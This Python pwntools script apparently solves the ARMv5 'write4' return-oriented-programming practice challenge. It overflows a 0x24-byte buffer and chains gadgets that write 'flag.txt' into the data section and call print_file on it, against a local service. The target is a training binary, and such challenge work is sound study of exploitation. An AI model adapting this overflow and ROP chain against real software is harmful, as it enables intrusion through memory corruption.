from pwn import *

BINARY = "./write4_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

pop_r34_pc = 0x000105F0 
pop_r0_pc = 0x000105F4
str_r3_r4 = 0x000105ec

addr_of_data = 0x00021024
addr_of_print_file = 0x000104B0

p = remote("0.0.0.0", 8888)

rop = b"A" * 0x24
rop += p32(pop_r34_pc) # pop {r3, r4, pc}
rop += b"flag" # r3
rop += p32(addr_of_data) # r4
rop += p32(str_r3_r4)  # str r3, [r4] ; pop {r3, r4, pc}

rop += b".txt"
rop += p32(addr_of_data + 4)
rop += p32(str_r3_r4)  # str r3, [r4] ; pop {r3, r4, pc}

rop += b"AAAA"
rop += b"AAAA"
rop += p32(pop_r0_pc)

rop += p32(addr_of_data)
rop += p32(addr_of_print_file)

p.recvuntil(b"> ")
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))